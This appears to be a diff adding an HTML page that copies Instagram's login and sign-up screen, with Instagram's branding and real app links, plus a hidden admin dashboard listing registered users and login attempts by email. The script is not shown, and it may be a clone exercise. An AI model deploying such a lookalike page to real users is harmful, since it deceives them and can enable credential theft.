@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div id="toast" class="toast"></div>
+
+  <!-- Admin View -->
+  <div id="adminView" class="admin-view" style="display: none;">
+    <div class="admin-container">
+      <div class="admin-header">
+        <div class="admin-title">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          <h1>Admin Dashboard</h1>
+        </div>
+        <button onclick="handleLogout()" class="logout-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+          Logout
+        </button>
+      </div>
+
+      <div class="table-section">
+        <h2>Registered Users</h2>
+        <div class="table-container">
+          <table id="usersTable">
+            <thead>
+              <tr>
+                <th>Email</th>
+                <th>Username</th>
+                <th>Last Login</th>
+              </tr>
+            </thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="table-section">
+        <h2>Login Attempts</h2>
+        <div class="table-container">
+          <table id="attemptsTable">
+            <thead>
+              <tr>
+                <th>Email</th>
+                <th>Timestamp</th>
+                <th>Status</th>
+              </tr>
+            </thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Login/Register View -->
+  <div id="authView" class="auth-container">
+    <div class="auth-box">
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg>
+      </div>
+      
+      <form id="authForm" onsubmit="handleAuth(event)">
+        <input
+          type="text"
+          id="email"
+          placeholder="Phone number, username, or email"
+          required
+        >
+        <input
+          type="password"
+          id="password"
+          placeholder="Password"
+          required
+        >
+        <div id="usernameField" style="display: none;">
+          <input
+            type="text"
+            id="username"
+            placeholder="Username"
+          >
+        </div>
+        
+        <button type="submit" id="submitBtn">Log in</button>
+
+        <div class="divider">
+          <div class="line"></div>
+          <span>OR</span>
+          <div class="line"></div>
+        </div>
+
+        <button type="button" class="facebook-login">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526" 
+            alt="Facebook"
+          >
+          Log in with Facebook
+        </button>
+
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </form>
+    </div>
+
+    <div class="signup-box">
+      <p>
+        <span id="authToggleText">Don't have an account?</span>
+        <button onclick="toggleAuth()" id="authToggleBtn" class="toggle-btn">
+          Sign up
+        </button>
+      </p>
+    </div>
+
+    <div class="get-app">
+      <p>Get the app.</p>
+      <div class="app-links">
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+          <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
+        </a>
+        <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt" target="_blank">
+          <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
